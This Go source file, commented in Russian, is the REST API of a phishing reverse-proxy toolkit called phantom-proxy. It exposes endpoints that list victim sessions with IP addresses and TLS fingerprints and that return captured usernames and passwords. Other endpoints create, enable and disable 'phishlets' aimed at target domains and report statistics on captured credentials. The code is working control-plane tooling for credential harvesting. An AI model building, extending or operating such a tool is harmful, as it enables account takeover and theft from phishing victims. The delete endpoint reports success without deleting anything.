package api

import (
	"encoding/json"
	"strconv"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/proxy"
)

// APIServer REST API сервер
type APIServer struct {
	app        *fiber.App
	proxy      *proxy.HTTPProxy
	db         *database.Database
	logger     *zap.Logger
	apiKey     string
}

// NewAPIServer создаёт новый API сервер
func NewAPIServer(proxy *proxy.HTTPProxy, db *database.Database, logger *zap.Logger, apiKey string) *APIServer {
	app := fiber.New(fiber.Config{
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  60 * time.Second,
	})

	s := &APIServer{
		app:    app,
		proxy:  proxy,
		db:     db,
		logger: logger,
		apiKey: apiKey,
	}

	s.setupRoutes()
	return s
}

// setupRoutes настраивает маршруты
func (s *APIServer) setupRoutes() {
	// Middleware для аутентификации
	s.app.Use(s.authMiddleware)

	// API routes
	api := s.app.Group("/api/v1")

	// Sessions
	api.Get("/sessions", s.listSessions)
	api.Get("/sessions/:id", s.getSession)
	api.Delete("/sessions/:id", s.deleteSession)

	// Credentials
	api.Get("/credentials", s.listCredentials)
	api.Get("/credentials/:id", s.getCredentials)

	// Phishlets
	api.Get("/phishlets", s.listPhishlets)
	api.Get("/phishlets/:id", s.getPhishlet)
	api.Post("/phishlets", s.createPhishlet)
	api.Put("/phishlets/:id", s.updatePhishlet)
	api.Delete("/phishlets/:id", s.deletePhishlet)
	api.Post("/phishlets/:id/enable", s.enablePhishlet)
	api.Post("/phishlets/:id/disable", s.disablePhishlet)
	api.Get("/phishlets/:id/health", s.checkPhishletHealth)

	// Stats
	api.Get("/stats", s.getStats)

	// Health check
	s.app.Get("/health", s.healthCheck)
}

// authMiddleware проверяет API ключ
func (s *APIServer) authMiddleware(c *fiber.Ctx) error {
	// Пропускаем health check
	if strings.HasPrefix(c.Path(), "/health") {
		return c.Next()
	}

	// Проверка API ключа
	apiKey := c.Get("Authorization")
	if apiKey == "" {
		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
			"error": "Authorization header required",
		})
	}

	// Убираем "Bearer " префикс
	apiKey = strings.TrimPrefix(apiKey, "Bearer ")

	if apiKey != s.apiKey {
		return c.Status(fiber.StatusForbidden).JSON(fiber.Map{
			"error": "Invalid API key",
		})
	}

	return c.Next()
}

// Session Response
type SessionResponse struct {
	ID         string    `json:"id"`
	VictimIP   string    `json:"victim_ip"`
	TargetURL  string    `json:"target_url"`
	PhishletID string    `json:"phishlet_id,omitempty"`
	UserAgent  string    `json:"user_agent,omitempty"`
	JA3Hash    string    `json:"ja3_hash,omitempty"`
	State      string    `json:"state"`
	CreatedAt  time.Time `json:"created_at"`
	LastActive time.Time `json:"last_active"`
}

// listSessions возвращает список сессий
func (s *APIServer) listSessions(c *fiber.Ctx) error {
	limit, _ := strconv.Atoi(c.Query("limit", "50"))
	offset, _ := strconv.Atoi(c.Query("offset", "0"))

	sessions, err := s.db.ListSessions(limit, offset)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	response := make([]SessionResponse, len(sessions))
	for i, session := range sessions {
		response[i] = SessionResponse{
			ID:         session.ID,
			VictimIP:   session.VictimIP,
			TargetURL:  session.TargetURL,
			PhishletID: session.PhishletID,
			UserAgent:  session.UserAgent,
			JA3Hash:    session.JA3Hash,
			State:      session.State,
			CreatedAt:  session.CreatedAt,
			LastActive: session.LastActive,
		}
	}

	return c.JSON(fiber.Map{
		"sessions": response,
		"total":    len(sessions),
	})
}

// getSession возвращает сессию по ID
func (s *APIServer) getSession(c *fiber.Ctx) error {
	id := c.Params("id")

	session, err := s.db.GetSession(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Session not found",
		})
	}

	return c.JSON(fiber.Map{
		"session": SessionResponse{
			ID:         session.ID,
			VictimIP:   session.VictimIP,
			TargetURL:  session.TargetURL,
			PhishletID: session.PhishletID,
			UserAgent:  session.UserAgent,
			JA3Hash:    session.JA3Hash,
			State:      session.State,
			CreatedAt:  session.CreatedAt,
			LastActive: session.LastActive,
		},
	})
}

// deleteSession удаляет сессию
func (s *APIServer) deleteSession(c *fiber.Ctx) error {
	id := c.Params("id")

	if err := s.db.DeleteSession(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success": true,
	})
}

// Credential Response
type CredentialResponse struct {
	ID           string            `json:"id"`
	SessionID    string            `json:"session_id"`
	Username     string            `json:"username"`
	Password     string            `json:"password"`
	CustomFields map[string]string `json:"custom_fields,omitempty"`
	CapturedAt   time.Time         `json:"captured_at"`
}

// listCredentials возвращает список креденшалов
func (s *APIServer) listCredentials(c *fiber.Ctx) error {
	limit, _ := strconv.Atoi(c.Query("limit", "50"))
	offset, _ := strconv.Atoi(c.Query("offset", "0"))

	creds, err := s.db.ListCredentials(limit, offset)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	response := make([]CredentialResponse, len(creds))
	for i, cred := range creds {
		response[i] = CredentialResponse{
			ID:           cred.ID,
			SessionID:    cred.SessionID,
			Username:     cred.Username,
			Password:     cred.Password,
			CustomFields: cred.CustomFields,
			CapturedAt:   cred.CapturedAt,
		}
	}

	return c.JSON(fiber.Map{
		"credentials": response,
		"total":       len(creds),
	})
}

// getCredentials возвращает креденшалы по ID
func (s *APIServer) getCredentials(c *fiber.Ctx) error {
	id := c.Params("id")

	session, err := s.db.GetSession(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Session not found",
		})
	}

	creds, err := s.db.GetCredentials(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Credentials not found",
		})
	}

	return c.JSON(fiber.Map{
		"session": SessionResponse{
			ID:         session.ID,
			VictimIP:   session.VictimIP,
			TargetURL:  session.TargetURL,
			State:      session.State,
			CreatedAt:  session.CreatedAt,
			LastActive: session.LastActive,
		},
		"credentials": CredentialResponse{
			ID:           creds.ID,
			SessionID:    creds.SessionID,
			Username:     creds.Username,
			Password:     creds.Password,
			CustomFields: creds.CustomFields,
			CapturedAt:   creds.CapturedAt,
		},
	})
}

// Phishlet Response
type PhishletResponse struct {
	ID           string                 `json:"id"`
	Name         string                 `json:"name"`
	TargetDomain string                 `json:"target_domain"`
	Config       map[string]interface{} `json:"config,omitempty"`
	IsActive     bool                   `json:"is_active"`
	CreatedAt    time.Time              `json:"created_at"`
	UpdatedAt    time.Time              `json:"updated_at"`
}

// listPhishlets возвращает список phishlets
func (s *APIServer) listPhishlets(c *fiber.Ctx) error {
	phishlets, err := s.db.ListPhishlets()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"phishlets": phishlets,
		"total":     len(phishlets),
	})
}

// getPhishlet возвращает phishlet по ID
func (s *APIServer) getPhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	config, err := s.db.GetPhishlet(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Phishlet not found",
		})
	}

	var phishlet proxy.Phishlet
	if err := json.Unmarshal([]byte(config), &phishlet); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Failed to parse phishlet",
		})
	}

	return c.JSON(fiber.Map{
		"phishlet": phishlet,
	})
}

// createPhishlet создаёт новый phishlet
func (s *APIServer) createPhishlet(c *fiber.Ctx) error {
	var req struct {
		ID           string `json:"id"`
		Name         string `json:"name"`
		TargetDomain string `json:"target_domain"`
		Config       string `json:"config"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	if req.ID == "" {
		req.ID = uuid.New().String()
	}

	if err := s.db.SavePhishlet(req.ID, req.Name, req.TargetDomain, req.Config); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.Status(fiber.StatusCreated).JSON(fiber.Map{
		"id":      req.ID,
		"success": true,
	})
}

// updatePhishlet обновляет phishlet
func (s *APIServer) updatePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	var req struct {
		Name         string `json:"name"`
		TargetDomain string `json:"target_domain"`
		Config       string `json:"config"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	if err := s.db.SavePhishlet(id, req.Name, req.TargetDomain, req.Config); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// deletePhishlet удаляет phishlet
func (s *APIServer) deletePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	// TODO: Реализовать удаление из БД

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// enablePhishlet активирует phishlet
func (s *APIServer) enablePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	if err := s.proxy.EnablePhishlet(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// disablePhishlet деактивирует phishlet
func (s *APIServer) disablePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	if err := s.proxy.DisablePhishlet(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// checkPhishletHealth проверяет доступность target URL phishlet
func (s *APIServer) checkPhishletHealth(c *fiber.Ctx) error {
	id := c.Params("id")

	health := s.proxy.CheckPhishletHealth(id)

	return c.JSON(health)
}

// Stats Response
type StatsResponse struct {
	TotalSessions    int `json:"total_sessions"`
	ActiveSessions   int `json:"active_sessions"`
	CapturedSessions int `json:"captured_sessions"`
	TotalCredentials int `json:"total_credentials"`
	ActivePhishlets  int `json:"active_phishlets"`
}

// getStats возвращает статистику
func (s *APIServer) getStats(c *fiber.Ctx) error {
	dbStats, err := s.db.GetStats()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	proxyStats := s.proxy.GetStats()

	return c.JSON(fiber.Map{
		"total_sessions":     dbStats["total_sessions"],
		"active_sessions":    proxyStats["active_sessions"],
		"captured_sessions":  dbStats["captured_sessions"],
		"total_credentials":  dbStats["total_credentials"],
		"active_phishlets":   dbStats["active_phishlets"],
		"total_requests":     proxyStats["total_requests"],
		"phishlets_loaded":   proxyStats["phishlets_loaded"],
	})
}

// healthCheck проверяет здоровье API
func (s *APIServer) healthCheck(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{
		"status":    "ok",
		"timestamp": time.Now().Format(time.RFC3339),
	})
}

// Start запускает API сервер
func (s *APIServer) Start(addr string) error {
	s.logger.Info("Starting API server", zap.String("addr", addr))
	
	// Явно указываем 0.0.0.0 для доступа извне
	if !strings.HasPrefix(addr, "0.0.0.0") && !strings.HasPrefix(addr, "127.0.0.1") {
		addr = "0.0.0.0:" + strings.Split(addr, ":")[1]
	}
	
	return s.app.Listen(addr)
}

// Shutdown останавливает API сервер
func (s *APIServer) Shutdown() error {
	return s.app.Shutdown()
}
